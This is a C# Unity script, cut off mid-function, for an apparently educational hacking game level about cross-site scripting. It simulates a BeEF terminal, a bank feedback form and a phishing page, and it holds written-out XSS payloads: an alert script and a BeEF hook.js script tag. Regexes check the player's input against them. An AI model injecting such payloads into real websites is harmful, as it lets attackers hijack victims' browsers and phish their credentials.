using UnityEngine;
using UnityEngine.InputSystem;
using System.Collections;
using UnityEngine.UI;
using System.Collections.Generic;
using System.Collections;
using TMPro;
using System.Text.RegularExpressions;



public class XSSComputer : MonoBehaviour, IInteractable, IChestable
{
    private const string RequiredQuestId = "3.1";

  
[Header("Essentials")]
    public GameObject XSSPanel;
        public PlayerInput playerInput;

        [SerializeField] GameObject guider;


        public GameObject Xbutton;
       

        public GameObject timer;




[Header("Terminal Variables")]

        public terminal terminalScript;

        public bombButton bombButtonScript;
        public TMP_InputField commandInput;

        public TMP_InputField UpdateText;
        [SerializeField] private ScrollRect outputScrollRect;
        [SerializeField, Range(0.01f, 0.5f)] private float successScrollStep = 0.12f;

[Header("Guider Bot Variables")]

        public GameObject playerHint;

        public GameObject LongHint;
        public GuiderBot guiderBot;
        public GameObject chatbubble;

     private bool MissionTime = false;
    public bool brainTime = false;
    [SerializeField] private float typewriterDelay = 0.002f;
    [SerializeField, Min(1)] private int charsPerStep = 4;
    private Coroutine typewriterRoutine;

        
[Header("IChestable Variables")]
        public bool IsOpened {get; private set;}
        [SerializeField] private int stableChestID;
        public int ChestID => stableChestID;

        public GameObject itemPrefab;
        public Sprite openedSprite;

 [Header("Brain Time Variables")]
        public GameObject lockImage;

        public GameObject brainText;

        public CanvasGroup brainTextContainer;

        public Button bombButton;

        public CanvasGroup brainCanvas;


        private CanvasGroup brainTextCanvas;
        private TMP_Text brainTextTMP;

[Header("Explosion Variables")]
        public GameObject Wall_to_Break;
        public Sprite brokenWall;


[Header("FeedBack Form")]
public Transform contentLocation; 
public GameObject textPrefab;

public TMP_InputField feedbackInputField;
public ScrollRect feedbackScrollRect;
public GameObject feedbackAlertPanel;

[SerializeField, Min(0.01f)] private float feedbackAlertHoldDuration = 5f;
[SerializeField, Min(0.01f)] private float feedbackAlertFadeDuration = 0.5f;

[Header("beEF Panel Variables")]
public GameObject beEFPannel_1;
public GameObject beEFPannel_2;
public GameObject beEFPannel_3;
public GameObject beEFPannel_4;
public GameObject beEFPannel_5;
public GameObject beEFPannel_6;


[Header("TopBar Variables")]
public GameObject beEFPage;
public GameObject terminalCanvas;

public GameObject beefPagebutton;


[Header("Search and Load Ipad Variables")]
        public Image firefoxSearchResults;
        public Slider firefoxLoadingBar;
        [SerializeField] private float firefoxPageLoadDuration = 0.8f;
        private Coroutine firefoxLoadingRoutine;

        public Sprite IpadHomePage;
        public Sprite BankFeedBackPage;
        public Sprite googlePhishingPage;

        public GameObject pixelIpad;


private CanvasGroup feedbackAlertCanvasGroup;
private TMP_Text feedbackAlertText;
private Coroutine feedbackAlertRoutine;

private bool notAllowBeef = false;


//disposable variables

private bool hookInjected = false;
private bool FirstAlert = false;
private static readonly Regex AlertScriptRegex = new Regex(
    @"^\s*<script>\s*alert\s*\(\s*(['\""])(.*?)\1\s*\)\s*;?\s*</script>\s*$",
    RegexOptions.IgnoreCase | RegexOptions.Singleline);

private static readonly Regex HookScriptRegex = new Regex(
    @"^\s*<script\s+src\s*=\s*\""http://127\.0\.0\.1:3000/hook\.js\""\s*>\s*</script>\s*$",
    RegexOptions.IgnoreCase | RegexOptions.Singleline);




        public static bool FirstTime = false;
        private bool hasTriggeredUrlMatchDialogue;
        private bool hasTriggeredFeedbackScriptCloseDialogue;
        private bool hasTriggeredFilePathDialogue;
        private bool isFilePathListenerBound;
        private RectTransform guiderRect;
        private Vector2 guiderInitialAnchoredPosition;
        private bool hasGuiderInitialAnchoredPosition;
        private int lastCommandSubmitFrame = -1;
        private bool PassedFirstMision = false;
        private bool PassedSecondMision = false;
        private bool PassedThirdMision = false;
        private bool isApplyingCommandHighlight;

        private bool hasTriggeredTerminalCopyDialogue;



        private string XSSOutput = @"<color=#ffbf80>[i]</color> GeoIP database is missing
<color=#ffbf80>[i]</color> Run geoipupdate to download / update Maxmind GeoIP database
<color=#99ff99>[*]</color> Please wait for the BeEF service to start.
<color=#99ff99>[*]</color> Initializing...
<color=#99ff99>[*]</color> You might need to refresh your browser once it opens.
<color=#99ff99>[*]</color> 
<color=#99ff99>[*]</color>Web UI: http://127.0.0.1:3000/ui/panel
<color=#99ff99>[*]</color>Hook: <script src=""http://<IP>:3000/hook.js""></script>
<color=#99ff99>[*]</color><color=#99b3ff>Example:</color> <script src=""http://127.0.0.1:3000/hook.js""></script> 

● beef-xss.service - beef-xss
     Loaded: loaded (/usr/lib/systemd/system/beef-xss.service; disabled; preset: disabled)
     Active: active (running) since Fri 2026-03-06 12:19:26 EST; 5s ago
 Invocation: 0c3d6ea764a649c198b72347dfd6b68b
   Main PID: 28934 (ruby)
      Tasks: 4 (limit: 27091)
     Memory: 147.4M (peak: 259.9M)
        CPU: 2.765s
     CGroup: /system.slice/beef-xss.service
             └─28934 ruby ./beef

Mar 06 12:19:26 kali systemd[1]: Started beef-xss.service - beef-xss.
Mar 06 12:19:27 kali beef-include-vendor[28934]: [12:19:26][*] Browser Ex…4.0
Mar 06 12:19:27 kali beef-include-vendor[28934]: [12:19:26]    |   Twit: …ect
Mar 06 12:19:27 kali beef-include-vendor[28934]: [12:19:26]    |   Site: …com
Mar 06 12:19:27 kali beef-include-vendor[28934]: [12:19:26]    |_  Wiki: …iki
Mar 06 12:19:27 kali beef-include-vendor[28934]: [12:19:26][*] Project Cr…rn)
Mar 06 12:19:27 kali beef-include-vendor[28934]: [12:19:26][*] BeEF is lo…...
Hint: Some lines were ellipsized, use -l to show in full.

[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1... ";

        




 void Awake()
    {
        if (stableChestID == 0)
        {
            stableChestID = GenerateStableChestID();
        }
    }

 void Start()
    {
        beefPagebutton.SetActive(false);
        beEFPage.SetActive(false);
        LoadFirefoxPage(IpadHomePage);

            beEFPannel_1.SetActive(false);
    beEFPannel_2.SetActive(false);
    beEFPannel_3.SetActive(false);
    beEFPannel_4.SetActive(false);
    beEFPannel_5.SetActive(false);
    beEFPannel_6.SetActive(false);




        if (UpdateText != null && UpdateText.textComponent != null)
        {
            UpdateText.textComponent.richText = true;
            UpdateText.textComponent.raycastTarget = true;
        }
        

        CacheGuiderUiPosition();
        ConfigureInputSubmitHandlers();


//Ichestable Start
    }

    private int GenerateStableChestID()
    {
        string scenePath = gameObject.scene.path;
        string hierarchyPath = GetHierarchyPath(transform);
        string key = scenePath + "|" + hierarchyPath;
        return DeterministicHash(key);
    }

    private string GetHierarchyPath(Transform target)
    {
        string path = target.name;
        Transform parent = target.parent;

        while (parent != null)
        {
            path = parent.name + "/" + path;
            parent = parent.parent;
        }

        return path;
    }

    private int DeterministicHash(string input)
    {
        unchecked
        {
            const int offsetBasis = (int)2166136261;
            const int prime = 16777619;
            int hash = offsetBasis;

            for (int index = 0; index < input.Length; index++)
            {
                hash ^= input[index];
                hash *= prime;
            }

            return hash == 0 ? 1 : hash;
        }
    }

    void Update()
    {
        HandleFirefoxCopyShortcut();
       


        if (!IsEnterPressedThisFrame())
        {
            return;
        }


        if ((MissionTime || brainTime) && commandInput.isFocused)
        {
            checkCommand();
            return;
        }

    }

public void closeTerminal()
    {

        terminalCanvas.SetActive(false);

        if (MissionTime || brainTime) {
            return;
        }
        else
        {
         LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);

                
           
        }
        
         
         
    }

    public void toggleTerminal()
    {

        bool willOpen = !terminalCanvas.activeSelf;
        if (willOpen)
        {
            CenterTerminalCanvas();
        }

        terminalCanvas.SetActive(willOpen);
        if (MissionTime || brainTime) {
            return;
        }
        else
        {
        guiderBot.StartDialogueRange(45, 45);
        LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
  
        }
        
    }

    private void CenterTerminalCanvas()
    {

        RectTransform rect = terminalCanvas.GetComponent<RectTransform>();
        rect.anchorMin = new Vector2(0.5f, 0.5f);
        rect.anchorMax = new Vector2(0.5f, 0.5f);
        rect.pivot = new Vector2(0.5f, 0.5f);
        rect.anchoredPosition = Vector2.zero;
    }


public void ActivateBankPage()
{
    LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);

    closeTerminal();
    beEFPage.SetActive(false);
    StartCoroutine(MoveIpadAndWait(new Vector3(554.16f, 97.8f, 0f), 1f));
}

public void ActivatebeEFPage(){

    if (notAllowBeef == true)
    {
        return;
     }


    closeTerminal();
    beEFPage.SetActive(true);
    LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
     LeanTween.scale(LongHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);

         

          


    if (MissionTime == false)
        {
            guiderBot.StartDialogueRange(50, 50, () =>
            {
                StartCoroutine(RunBeEfIntroSequence());
            });

        }
        else
        {

            StartCoroutine(MoveIpadAndWait(new Vector3(310.1874f, 97.8f, 0f), 1f));    
            if (hookInjected)
            {
    LoadFirefoxPage(BankFeedBackPage);
    ActivatePanel1();           
     }
            
        }

}


public void ActivatePanel1(){

            LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
    
    beEFPannel_1.SetActive(true);

    beEFPannel_2.SetActive(false);
    beEFPannel_3.SetActive(false);
    beEFPannel_4.SetActive(false);
    beEFPannel_5.SetActive(false);
    beEFPannel_6.SetActive(false);

}

public void ActivatePanel2(){

            LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
    
    beEFPannel_2.SetActive(true);

    beEFPannel_1.SetActive(false);
    beEFPannel_3.SetActive(false);
    beEFPannel_4.SetActive(false);
    beEFPannel_5.SetActive(false);
    beEFPannel_6.SetActive(false);

    if (MissionTime == false)
        {
            guiderBot.StartDialogueRange(54, 54, () =>
            {
                ShowHint(-84.8f, 78.6f);
            });
        }

}

public void ActivatePanel3(){

            LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
    
    beEFPannel_3.SetActive(true);

    beEFPannel_1.SetActive(false);
    beEFPannel_2.SetActive(false);
    beEFPannel_4.SetActive(false);
    beEFPannel_5.SetActive(false);
    beEFPannel_6.SetActive(false);

        if (MissionTime == false)
        {
            guiderBot.StartDialogueRange(55, 55, () =>
            {
                ShowHint(-115.4f, -99.3f);
            });
        }

}
public void ActivatePanel4(){

            LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
    
    beEFPannel_4.SetActive(true);

    beEFPannel_1.SetActive(false);
    beEFPannel_3.SetActive(false);
    beEFPannel_2.SetActive(false);
    beEFPannel_5.SetActive(false);
    beEFPannel_6.SetActive(false);

        if (MissionTime == false)
        {
            guiderBot.StartDialogueRange(56, 56, () =>
            {
                ShowHint(-112.8f, -79.7f);
            });
        }

}
public void ActivatePanel5(){

            LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
    
    beEFPannel_5.SetActive(true);

    beEFPannel_1.SetActive(false);
    beEFPannel_3.SetActive(false);
    beEFPannel_4.SetActive(false);
    beEFPannel_2.SetActive(false);
    beEFPannel_6.SetActive(false);

    if (MissionTime == false)
        {
            guiderBot.StartDialogueRange(56, 56, () =>
            {
                TweenGuiderAnchoredX(362f, 0.3f);
                ShowHint(286f, -188f);
            });
        }

}
public void ActivatePanel6(){

    LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
if (MissionTime == false){
    guiderBot.StartDialogueRange(59, 59, () =>
            {
                     LeanTween.scale(timer, new Vector3(1, 1, 0), 0.3f)
                    .setEase(LeanTweenType.easeInOutBack);
           
       LeanTween.moveLocal ( timer,  new Vector3 (228.9f,170.5f,0f) ,2f )
                    .setEase(LeanTweenType.easeInOutBack);

                    Timer.Instance.ResetTimer();
                    Timer.Instance.StartTimer();
                    BackgroundMusicManager.SwitchToMissionMusic();

                    closeGuiderBot();
                    commandInput.SetTextWithoutNotify(string.Empty);
                    StartTypewriter("");
                    MissionTime = true;
                    beefPagebutton.SetActive(false);
                    ActivateBankPage();
                    LoadFirefoxPage(IpadHomePage);

                    beEFPannel_1.SetActive(false);
                    beEFPannel_2.SetActive(false);
                    beEFPannel_3.SetActive(false);
                    beEFPannel_4.SetActive(false);
                    beEFPannel_5.SetActive(false);
                    beEFPannel_6.SetActive(false);

            });
}
    

    
    beEFPannel_6.SetActive(true);

    beEFPannel_1.SetActive(false);
    beEFPannel_3.SetActive(false);
    beEFPannel_4.SetActive(false);
    beEFPannel_5.SetActive(false);
    beEFPannel_2.SetActive(false);

  

}

public void ExcecuteButton()
    {

        LoadFirefoxPage(googlePhishingPage);
        LeanTween.scale(playerHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);

        if(MissionTime == false)
        {
            guiderBot.StartDialogueRange(57, 58, () =>
            {
                ShowHint(-119.7f, 78.1f);
            });
        }else if (MissionTime == true)
        {
            SoundManager.Play("Success");
            QuestProgress quest = MissionController.Instance.activeMissions.Find(q => q.questID == "3.3");
        quest.isCompleted = true;
        MissionUI.Instance.CompleteMission("3");

        
        PassedThirdMision = true;
        AllMissionCompleted();
        }
    }


    private void LoadFirefoxPage(Sprite targetPage)
    {
        if (firefoxLoadingRoutine != null)
        {
            StopCoroutine(firefoxLoadingRoutine);
            firefoxLoadingRoutine = null;
        }

        firefoxLoadingRoutine = StartCoroutine(LoadFirefoxPageRoutine(targetPage));
    }

    private IEnumerator LoadFirefoxPageRoutine(Sprite targetPage)
    {
        if (firefoxLoadingBar == null)
        {
            firefoxSearchResults.sprite = targetPage;
            firefoxLoadingRoutine = null;
            yield break;
        }

        firefoxLoadingBar.gameObject.SetActive(true);
        firefoxLoadingBar.value = 0f;

        float duration = Mathf.Max(0.01f, firefoxPageLoadDuration);
        float elapsed = 0f;

        while (elapsed < duration)
        {
            elapsed += Time.unscaledDeltaTime;
            firefoxLoadingBar.value = Mathf.Clamp01(elapsed / duration);
            yield return null;
        }

        firefoxSearchResults.sprite = targetPage;
        firefoxLoadingBar.value = 1f;
        yield return new WaitForSecondsRealtime(0.08f);
        firefoxLoadingBar.gameObject.SetActive(false);

        firefoxLoadingRoutine = null;
    }




public void WriteToTerminal()
    {
        string feedbackValue = feedbackInputField.text;
        bool isAlertScript = TryExtractAlertMessage(feedbackValue, out string alertMessage);
        bool isHookScript = HookScriptRegex.IsMatch(feedbackValue);

        GameObject newText = Instantiate(textPrefab, contentLocation);
        TextMeshProUGUI textUI = newText.GetComponent<TextMeshProUGUI>();
        textUI.text = (isAlertScript || isHookScript)
            ? "<color=red>" + feedbackValue + "</color>"
            : feedbackValue;

        if (isAlertScript)
        {
FirstAlert = true;
ShowFeedbackAlertPanel(alertMessage);
if (!MissionTime)
{
    guiderBot.StartDialogueRange(42, 42, () =>
    {
        StartCoroutine(StartDialogueRangeDelayedWithCallback(43, 44, 2.0f, () =>
        {
            ShowHint(-190.69f, 200.1f);
        }));
    });
}
            
        } else {
             if (MissionTime == false && !FirstAlert)
             {
                 guiderBot.StartDialogueRange(40, 40);
             }
        }

        

        if (HookScriptRegex.IsMatch(feedbackValue))
        {


            if (MissionTime == false)
            {
                guiderBot.StartDialogueRange(49, 49, () =>
                {
                    notAllowBeef = false;
                    ShowHint(-114f, 174f);
                });
            } else if (MissionTime == true)
            {
                hookInjected = true;
                SoundManager.Play("Success");
                QuestProgress quest = MissionController.Instance.activeMissions.Find(q => q.questID == "3.2");
        quest.isCompleted = true;
        MissionUI.Instance.CompleteMission("2");

        
        PassedSecondMision = true;
        AllMissionCompleted();
            }

        }

        feedbackInputField.SetTextWithoutNotify(string.Empty);

        Canvas.ForceUpdateCanvases();
        feedbackScrollRect.verticalNormalizedPosition = 0f;
    }

    private bool TryExtractAlertMessage(string input, out string alertMessage)
    {
        alertMessage = string.Empty;
        if (string.IsNullOrWhiteSpace(input))
        {
            return false;
        }

        Match match = AlertScriptRegex.Match(input);
        if (!match.Success)
        {
            return false;
        }

        alertMessage = match.Groups[2].Value;
        return true;
    }

    private void ShowFeedbackAlertPanel(string alertMessage)
    {
        if (feedbackAlertRoutine != null)
        {
            StopCoroutine(feedbackAlertRoutine);
        }

        feedbackAlertRoutine = StartCoroutine(ShowFeedbackAlertPanelRoutine(alertMessage));
    }

    private IEnumerator ShowFeedbackAlertPanelRoutine(string alertMessage)
    {
        feedbackAlertPanel.SetActive(true);

        feedbackAlertCanvasGroup = feedbackAlertPanel.GetComponent<CanvasGroup>();
        feedbackAlertText = feedbackAlertPanel.GetComponentInChildren<TMP_Text>(true);
        feedbackAlertText.text = alertMessage;

        feedbackAlertCanvasGroup.alpha = 1f;
        float holdDuration = Mathf.Max(0.01f, feedbackAlertHoldDuration);
        yield return new WaitForSecondsRealtime(holdDuration);

        float duration = Mathf.Max(0.01f, feedbackAlertFadeDuration);
        float elapsed = 0f;
        while (elapsed < duration)
        {
            elapsed += Time.unscaledDeltaTime;
            feedbackAlertCanvasGroup.alpha = Mathf.Lerp(1f, 0f, elapsed / duration);
            yield return null;
        }

        feedbackAlertCanvasGroup.alpha = 0f;
        feedbackAlertPanel.SetActive(false);
        feedbackAlertRoutine = null;
    }
    

    public void AllMissionCompleted()
    {
        if (PassedFirstMision == true && PassedSecondMision == true && PassedThirdMision == true)
        {
            IsOpened = true;
            brainTime = true;
            MissionTime = false;
            terminalScript.brainTime = true;
            bombButtonScript.BrainTime = true;
            BackgroundMusicManager.SwitchToBrainTimeMusic();

StartTypewriter("Hit Enter to excecute command") ;
            if (commandInput != null)
            {
                commandInput.SetTextWithoutNotify(string.Empty);
            }

             Timer.Instance.StopTimer();
        LevelController.Instance.UpdateLevelStatus(2, "XSS Cross Site Scripting", true);

        LeanTween.scale(timer, new Vector3(2, 2, 0), 2f)
        .setEase(LeanTweenType.easeInOutBack);
       LeanTween.moveLocal ( timer,  new Vector3 (0,0,0) ,2f )
        .setEase(LeanTweenType.easeInOutBack);
         LeanTween.scale(timer, new Vector3(0, 0, 0), 1f)
        .setEase(LeanTweenType.easeOutCubic).setDelay(5f);

StartCoroutine(FadeInWaitAndFadeOut(brainCanvas, 3f));
        brainText.SetActive(true);
    brainTextTMP = brainText.GetComponent<TMP_Text>();

        brainTextTMP.text = "Start BeEf to deduct 10s off the clock";
        PositionBrainTextContainer(-114.27f);
        brainTextContainer.alpha = 0f;
        StartCoroutine(FadeInWithDelay(brainTextContainer, 1f));
      LeanTween.moveY(bombButton.gameObject, 105.5f, 1f)
        .setEase(LeanTweenType.easeOutCubic).setDelay(8f);
      
        

    
        }
    }

    private void CenterBrainCanvas()
{
    if (brainCanvas == null)
    {
        return;
    }

    RectTransform rect = brainCanvas.GetComponent<RectTransform>();
    if (rect == null)
    {
        return;
    }

    rect.anchorMin = new Vector2(0.5f, 0.5f);
    rect.anchorMax = new Vector2(0.5f, 0.5f);
    rect.pivot = new Vector2(0.5f, 0.5f);
    rect.anchoredPosition = Vector2.zero;
}

    IEnumerator FadeInWithDelay(CanvasGroup canvasGroup, float delaySeconds)
{
    yield return new WaitForSeconds(delaySeconds);
    yield return StartCoroutine(FadeIn(canvasGroup));
}

                private void PositionBrainTextContainer(float positionY)
    {
 

        RectTransform containerRect = brainTextContainer.GetComponent<RectTransform>();
        containerRect.anchoredPosition = new Vector2(containerRect.anchoredPosition.x, positionY);
    }

    



    private bool TryResolveBrainText()
    {
        if (brainText != null)
        {
            return true;
        }

        if (brainCanvas != null)
        {
            TMP_Text fallbackText = brainCanvas.GetComponentInChildren<TMP_Text>(true);
            if (fallbackText != null)
            {
                brainText = fallbackText.gameObject;
                return true;
            }
        }

        Debug.LogWarning("BrokenAccessComputer: brainText reference is missing. Assign it in Inspector or place a TMP_Text under brainCanvas.", this);
        return false;
    }

   

    

   

  

    

    private bool IsEnterPressedThisFrame()
    {
        if (Keyboard.current == null)
        {
            return Input.GetKeyDown(KeyCode.Return) || Input.GetKeyDown(KeyCode.KeypadEnter);
        }

        return Keyboard.current.enterKey.wasPressedThisFrame || Keyboard.current.numpadEnterKey.wasPressedThisFrame;
    }

    private bool IsEnterPressedNow()
    {
        if (Keyboard.current == null)
        {
            return Input.GetKey(KeyCode.Return) || Input.GetKey(KeyCode.KeypadEnter);
        }

        return Keyboard.current.enterKey.isPressed || Keyboard.current.numpadEnterKey.isPressed;
    }

    private void ConfigureInputSubmitHandlers()
    {

        ConfigureInput(commandInput);
        ConfigureCommandInputHighlighting();
        ConfigureFeedbackInputListener();
    }

    private void ConfigureFeedbackInputListener()
    {
        feedbackInputField.onValueChanged.RemoveListener(OnFeedbackInputChanged);
        feedbackInputField.onValueChanged.AddListener(OnFeedbackInputChanged);
    }

    private void OnFeedbackInputChanged(string currentValue)
    {
        if (MissionTime)
        {
            hasTriggeredFeedbackScriptCloseDialogue = false;
            return;
        }

  

        string normalizedValue = string.IsNullOrEmpty(currentValue)
            ? string.Empty
            : currentValue.TrimEnd();

        bool hasClosingScriptTag = normalizedValue.EndsWith("</script>", System.StringComparison.OrdinalIgnoreCase);
        if (hasClosingScriptTag && !hasTriggeredFeedbackScriptCloseDialogue)
        {
            hasTriggeredFeedbackScriptCloseDialogue = true;
            if (MissionTime == false)
            {
                guiderBot.StartDialogueRange(41, 41);
            }
            return;
        }

        if (!hasClosingScriptTag)
        {
            hasTriggeredFeedbackScriptCloseDialogue = false;
        }
    }

    private void ConfigureCommandInputHighlighting()
    {
        if (commandInput == null)
        {
            return;
        }

        if (commandInput.textComponent != null)
        {
            commandInput.textComponent.richText = true;
        }

        commandInput.onValueChanged.RemoveListener(OnCommandInputChanged);
        commandInput.onValueChanged.AddListener(OnCommandInputChanged);
    }

    private void OnCommandInputChanged(string currentValue)
    {
        if (isApplyingCommandHighlight || commandInput == null)
        {
            return;
        }

        string plainText = StripRichText(currentValue);
        string highlightedText = HighlightCommandKeywords(plainText);

        if (highlightedText == currentValue)
        {
            return;
        }

        isApplyingCommandHighlight = true;
        int caretPosition = Mathf.Clamp(commandInput.caretPosition, 0, plainText.Length);
        commandInput.SetTextWithoutNotify(highlightedText);
        commandInput.caretPosition = caretPosition;
        commandInput.selectionAnchorPosition = caretPosition;
        commandInput.selectionFocusPosition = caretPosition;
        isApplyingCommandHighlight = false;
    }

    private string HighlightCommandKeywords(string input)
    {
        if (string.IsNullOrEmpty(input))
        {
            return string.Empty;
        }

        string highlighted = Regex.Replace(
            input,
            @"\bgobuster\b",
            "<color=#2ECC71>$0</color>",
            RegexOptions.IgnoreCase);

        highlighted = Regex.Replace(
            highlighted,
            @"(?<!\S)(-u|-w)(?!\S)",
            "<color=#F39C12>$1</color>",
            RegexOptions.IgnoreCase);

        return highlighted;
    }

    private string StripRichText(string input)
    {
        if (string.IsNullOrEmpty(input))
        {
            return string.Empty;
        }

        return Regex.Replace(input, "<.*?>", string.Empty);
    }

    

    private void EvaluateFilePathMatch(string currentValue)
    {
        if (guiderBot == null)
        {
            return;
        }

        string normalizedValue = currentValue == null ? string.Empty : currentValue.Trim();
        

       

    }





    private void ConfigureInput(TMP_InputField inputField)
    {
        if (inputField == null)
        {
            return;
        }

        inputField.lineType = TMP_InputField.LineType.SingleLine;
        inputField.onFocusSelectAll = false;
        inputField.onEndEdit.AddListener(OnInputEndEdit);
    }

    private void OnInputEndEdit(string _)
    {
        if (!XSSPanel.activeSelf || !IsEnterPressedNow())
        {
            return;
        }

        if (lastCommandSubmitFrame == Time.frameCount)
        {
            return;
        }

        lastCommandSubmitFrame = Time.frameCount;

        checkCommand();
    }

    


private void HandleFirefoxCopyShortcut()
    {
        if (hasTriggeredTerminalCopyDialogue || !UpdateText.isFocused || MissionTime || brainTime)
         {
             return;
         }
 

        bool isCtrlPressed;
        bool isCPressedThisFrame;

        if (Keyboard.current == null)
        {
            isCtrlPressed = Input.GetKey(KeyCode.LeftControl) || Input.GetKey(KeyCode.RightControl);
            isCPressedThisFrame = Input.GetKeyDown(KeyCode.C);
        }
        else
        {
            isCtrlPressed = Keyboard.current.leftCtrlKey.isPressed || Keyboard.current.rightCtrlKey.isPressed;
            isCPressedThisFrame = Keyboard.current.cKey.wasPressedThisFrame;
        }

        if (!isCtrlPressed || !isCPressedThisFrame)
        {
            return;
        }

        hasTriggeredTerminalCopyDialogue = true;
        guiderBot.StartDialogueRange(48, 48, ()=>{
            ShowHint(-245.3f, 175.3f);
        });
        LeanTween.scale(LongHint, new Vector3(0, 0, 0), 0.3f)
                         .setEase(LeanTweenType.easeInOutBack);
    }


      public void checkCommand()
    {
               
        string command = commandInput != null ? StripRichText(commandInput.text).Trim() : string.Empty;

        if (command.Equals("sudo beef-xss", System.StringComparison.OrdinalIgnoreCase))
        {
           SoundManager.Play("Success");

            StartTypewriter(XSSOutput);
            beefPagebutton.SetActive(true);


            if (MissionTime == false)
            {
                guiderBot.StartDialogueRange(46, 46, () =>
                {
                    notAllowBeef = true;
                    StartCoroutine(StartDialogueRangeDelayedWithCallback(47, 47, 1.0f, () =>
                    {
                        ShowLongHint(4.1736f, -97.8f);
                    }));
                });
            }

            if (MissionTime == true)
                {
                            QuestProgress quest = MissionController.Instance.activeMissions.Find(q => q.questID == "3.1");
        quest.isCompleted = true;
        MissionUI.Instance.CompleteMission("1");

        
        PassedFirstMision = true;
        AllMissionCompleted();
                }

            if (brainTime == true)
                {
                    OpenChest();
            bombButton.onClick.Invoke();
            NotificationManager.Instance.Display("Successfully deducted 10 seconds!");
            Timer.Instance.DeductTime(10f);
           savecontroller.Instance.DeductSavedLevelTime(2, 10f);               
                    lockImage.SetActive(false);
                    brainTime = false;
                    brainText.SetActive(false);
                    BackgroundMusicManager.SwitchToDefaultMusic();
                }
                        
        }
        else
        {
            commandInput.SetTextWithoutNotify(string.Empty);
            StartTypewriter("invalid command");
        }    
        
        
    }

    private void StartTypewriter(string fullText)
    {
        if (typewriterRoutine != null)
        {
            StopCoroutine(typewriterRoutine);
        }

        typewriterRoutine = StartCoroutine(TypeText(fullText));
    }

    private IEnumerator TypeText(string fullText)
    {
        UpdateText.text = string.Empty;

        int step = Mathf.Max(1, charsPerStep);
        for (int index = 0; index < fullText.Length; index += step)
        {
            int chunkLength = Mathf.Min(step, fullText.Length - index);
            UpdateText.text += fullText.Substring(index, chunkLength);
            yield return new WaitForSecondsRealtime(typewriterDelay);
        }

        typewriterRoutine = null;
    }

    private void ScrollOutputSlightlyDown()
    {
        if (outputScrollRect == null && UpdateText != null)
        {
            outputScrollRect = UpdateText.GetComponentInParent<ScrollRect>();
        }

        if (outputScrollRect == null)
        {
            return;
        }

        Canvas.ForceUpdateCanvases();
        outputScrollRect.verticalNormalizedPosition = Mathf.Clamp01(outputScrollRect.verticalNormalizedPosition - successScrollStep);
    }


     public void OpenChest()
{

   SoundManager.Play("timer");
   StartCoroutine(OpenChestRoutine());

}


private IEnumerator OpenChestRoutine()
    {
        yield return new WaitForSeconds(3f);
         SetOpened(true);
        savecontroller.Instance?.SaveGame();
    SoundManager.Play("Dynamite");

    if (itemPrefab)
    {
        GameObject droppedItem =
            Instantiate(itemPrefab, transform.position , Quaternion.identity);
            //i want to change some tiles with collision to non collision and change their sprite

    }

  
    
    }


    public void SetOpened(bool opened)
    {
        if (opened)
        {
              Wall_to_Break.GetComponent<Collider2D>().enabled = false;
    Wall_to_Break.GetComponent<SpriteRenderer>().sprite = brokenWall;
            GetComponent<SpriteRenderer>().sprite = openedSprite;
        }
    }

 public void Interact()
    {
        if (!CanInteract())
        {
            return;
        }

        XSSPanel.SetActive(!XSSPanel.activeSelf);
        guider.SetActive(!guider.activeSelf);

if (MissionTime == false)
{
terminalScript.Training = true;
FirstTimeGuider();
}
        


  
        
        if (XSSPanel.activeSelf == true)
        {
        PauseController.SetPause(true);
                playerInput.SwitchCurrentActionMap("UI");
               

        }
        else
        {
            PauseController.SetPause(false);
                    playerInput.SwitchCurrentActionMap("Player");

        }

    }


    public void closeXSSPanel()
    {
        XSSPanel.SetActive(false);
        guider.SetActive(false);
        PauseController.SetPause(false);
                playerInput.SwitchCurrentActionMap("Player");
    }


 


    public bool CanInteract()
    {
        return !IsOpened && HasRequiredMission();
    }

    private bool HasRequiredMission()
    {
        if (MissionController.Instance == null || MissionController.Instance.activeMissions == null)
        {
            return false;
        }

        return MissionController.Instance.activeMissions.Exists(q =>
            q != null && string.Equals(q.questID, RequiredQuestId, System.StringComparison.OrdinalIgnoreCase));
    }

private void CacheGuiderUiPosition()
{
    if (guider == null)
    {
        return;
    }

    guiderRect = guider.GetComponent<RectTransform>();
    if (guiderRect == null)
    {
        return;
    }

    guiderInitialAnchoredPosition = guiderRect.anchoredPosition;
    hasGuiderInitialAnchoredPosition = true;
}

private void RestoreGuiderUiPosition()
{
    if (!hasGuiderInitialAnchoredPosition || guiderRect == null)
    {
        return;
    }

    guiderRect.anchoredPosition = guiderInitialAnchoredPosition;
}

private void TweenGuiderAnchoredX(float targetX, float duration, float delay = 0f)
{
    if (guiderRect == null && guider != null)
    {
        guiderRect = guider.GetComponent<RectTransform>();
    }

    if (guiderRect == null)
    {
        LTDescr fallbackTween = LeanTween.moveX(guider, targetX, duration)
            .setEase(LeanTweenType.easeInOutBack);

        if (delay > 0f)
        {
            fallbackTween.setDelay(delay);
        }

        return;
    }

    float startX = guiderRect.anchoredPosition.x;
    LTDescr tween = LeanTween.value(guider, startX, targetX, duration)
        .setEase(LeanTweenType.easeInOutBack)
        .setOnUpdate((float x) =>
        {
            Vector2 pos = guiderRect.anchoredPosition;
            pos.x = x;
            guiderRect.anchoredPosition = pos;
        });

    if (delay > 0f)
